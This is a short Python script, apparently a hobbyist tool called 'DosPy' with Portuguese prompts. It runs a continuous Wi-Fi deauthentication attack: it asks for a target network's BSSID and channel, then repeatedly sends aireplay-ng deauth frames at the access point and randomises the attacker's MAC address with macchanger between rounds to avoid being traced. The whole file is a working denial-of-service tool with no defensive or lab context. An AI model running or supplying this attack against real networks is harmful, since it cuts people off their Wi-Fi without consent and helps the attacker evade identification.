import os
from time import sleep

print('----------')
print('DosPy - By Seeker')
print('----------')
 
interface = str(input('Interface de Rede: '))
MAC = input('Digite o BSSID da rede:  ')
canal = int(input('Canal da Rede: '))
print('Precione as teclas Ctrl + C para finalizar o programa')
sleep(3)
 
while True:
    try:
        os.system(f"iw dev {interface} set channel {canal}")
        os.system(f"aireplay-ng --deauth 5 -a {MAC} wlan0 | grep 'DeAuth'")
        os.system(f"ip link set {interface} down")
        os.system(f"macchanger -r {interface} | grep 'New MAC' ")
        os.system(f"ip link set {interface} up")
        sleep(3)
    except KeyboardInterrupt:
        print('Programa finalizado por escolha do usuario!')
        exit()
